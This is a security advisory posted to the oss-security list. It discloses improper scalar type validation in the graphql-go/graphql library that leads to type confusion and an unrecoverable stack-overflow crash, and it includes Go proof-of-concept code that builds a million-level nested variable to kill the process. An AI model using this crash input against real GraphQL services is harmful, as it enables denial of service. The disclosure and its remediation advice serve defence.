X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/25/2
Message-ID: <CAK=gNzoPZmvUgHEv3g4eY-6cWCmKozOW7RfmfVmM060EjUwSoA@mail.gmail.com>
Date: Tue, 25 Aug 2026 11:32:52 +0330
From: First name Last name <0x6675636b736f6369617479@...il.com>
To: oss-security@...ts.openwall.com
Subject: graphql-go/graphql <= 0.8.1: improper scalar input-type validation -> type confusion and unrecoverable stack-overflow DoS
Content-Type: text/plain; charset=utf-8

Hello,

This reports a security defect in github.com/graphql-go/graphql (GraphQL
for Go), affecting all released versions up to and including the latest,
v0.8.1 (released 2023-04-10). No fixed version exists.

The repository has no private security-reporting channel: GitHub private
vulnerability reporting is disabled and there is no SECURITY.md. This is
therefore disclosed publicly. A CVE ID has been requested from MITRE (CNA
of Last Resort) and is pending.

== Summary ==

graphql-go/graphql does not validate that a scalar variable value matches
its declared type. The built-in coerceString and coerceBool functions
(scalars.go) accept input whose type does not match the declared String,
ID, or Boolean scalar instead of raising the request error the GraphQL
specification mandates and coerce it anyway. One root cause, two
consequences:

  1. (primary) Unrecoverable denial of service. For String/ID, a non-string
value is passed to fmt.Sprintf("%v", value); a deeply nested value supplied
as a String/ID/Boolean variable drives unbounded recursion in the fmt
package, producing a Go "fatal error: stack overflow" that terminates the
process and cannot be caught by recover().

  2. (secondary) Improper input validation / type confusion. A wrong-typed
value (e.g. a JSON object where String is declared) is accepted with no
error and the resolver receives its %v string rendering, contrary to the
spec.

== Affected ==

  Product:  github.com/graphql-go/graphql
  Versions: all <= v0.8.1 (latest release); no fix available
  Verified: reproduced against v0.8.1 fetched from the Go module proxy;
scalars.go is byte-identical between v0.8.1 and current master.

== Details ==

coerceString (scalars.go, v0.8.1 lines 307-315):

    func coerceString(value interface{}) interface{} {
        if v, ok := value.(*string); ok {
            if v == nil {
                return nil
            }
            return *v
        }
        return fmt.Sprintf("%v", value)   // accepts ANY type
    }

The scalar input-validation gate (values.go) treats a value as valid when
the scalar's ParseValue returns a non-nullish result. For String,
ParseValue is coerceString, which returns a non-nil string for every
possible Go value (maps, slices, structs) via the fmt.Sprintf fallback. So
validation never rejects a wrong type. ID delegates to coerceString and
inherits this. coerceBool has the analogous defect: unhandled types fall
through to "return false" (a valid Boolean), and strings are
JS-truthy-coerced rather than rejected.

For the crash: fmt.Sprintf("%v", value) on a deeply nested
map[string]interface{} recurses one fmt-internal frame per level
(fmt.(*pp).printValue / handleMethods). Go's goroutine stack has a hard 1
GB ceiling, therefore, exceeding it is a runtime fatal error, not a panic,
and cannot be recovered.

== Specification ==

This violates explicit mandatory ("must") language in the GraphQL
specification (October 2021 edition, section 3.5, scalar Input Coercion):

  String:  "only valid Unicode string input values are accepted. All other
input values must raise a request error indicating an incorrect
           type."
  Boolean: "only boolean input values are accepted. All other input values
must raise a request error indicating an incorrect type."

coerceInt and coerceFloat in the same file implement the equivalent rule
correctly (they type-switch and return nil for other types), which shows
the String/Boolean/ID behavior is an inconsistency, not an intended design.

== Impact and reachability ==

The primary impact is the process-terminating crash. Its reachability is
gated by how variables reach the library: the most common transport, an
HTTP JSON body decoded by Go's standard encoding/json, is NOT vulnerable
and not marginally. encoding/json caps decoding at nesting depth 10000,
whereas the crash requires roughly 600000 levels (measured: survives
10k/100k/300k, crashes near 600k), a ~60x margin. Realistic exposure is
therefore via a non-JSON transport (gRPC/protobuf, MessagePack,
message-queue payloads), variables constructed programmatically rather than
decoded from a single JSON body, or a JSON decoder configured without a
depth cap.

The type-confusion half is unconditional but weak as a standalone impact:
the resolver receives a correctly-typed Go string (the %v rendering), and a
client could already supply any string to a String argument so the defect
is the failure to reject the wrong type, not any new injectable content.
Its concrete risk depends on downstream application code that trusts the
declared type.

For reference, this library already carries CVE-2022-37315 (CWE-674) for an
analogous uncontrolled-recursion crash in its SDL type-definition parser, a
less attacker-facing vector than query variables.

== Proof of concept ==

Both parts use only the library's public API and reproduce against v0.8.1.

Part 1 -- type-confusion (no crash):

    package main

    import (
        "fmt"
        "github.com/graphql-go/graphql"
    )

    func main() {
        queryType := graphql.NewObject(graphql.ObjectConfig{
            Name: "Query",
            Fields: graphql.Fields{
                "echo": &graphql.Field{
                    Type: graphql.String,
                    Args: graphql.FieldConfigArgument{
                        "n": &graphql.ArgumentConfig{Type: graphql.String},
                    },
                    Resolve: func(p graphql.ResolveParams) (interface{},
error) {
                        return fmt.Sprintf("%T / %v", p.Args["n"],
p.Args["n"]), nil
                    },
                },
            },
        })
        schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query:
queryType})

        r := graphql.Do(graphql.Params{
            Schema:        schema,
            RequestString: `query($n: String){ echo(n:$n) }`,
            VariableValues: map[string]interface{}{
                "n": map[string]interface{}{"admin": true, "x":
[]interface{}{1, 2, 3}},
            },
        })
        // Observed: r.Errors is empty (spec requires a request error).
        // Resolver received: "string / map[admin:true x:[1 2 3]]"
        fmt.Printf("errors=%v data=%v\n", r.Errors, r.Data)
    }

Part 2 -- unrecoverable crash (same schema):

    depth := 1000000
    var v interface{} = "leaf"
    for i := 0; i < depth; i++ {
        v = map[string]interface{}{"n": v}
    }
    graphql.Do(graphql.Params{
        Schema:        schema,
        RequestString: `query($n: String){ echo(n:$n) }`,
        VariableValues: map[string]interface{}{"n": v},
    })
    // runtime: goroutine stack exceeds 1000000000-byte limit
    // fatal error: stack overflow
    //   ... fmt.(*pp).printValue ... fmt.(*pp).handleMethods ...

== Remediation ==

coerceString should accept only string/*string (ID additionally int/float
per the spec's ID coercion rule) and return nil for other types; coerceBool
should accept only bool/*bool and return nil otherwise, with no string
coercion. Returning nil makes the input-validation gate raise the
spec-mandated request error, which closes BOTH consequences -- a
wrong-typed value never reaches fmt.Sprintf.

== Credit ==

  William Carrier, independent security researcher.

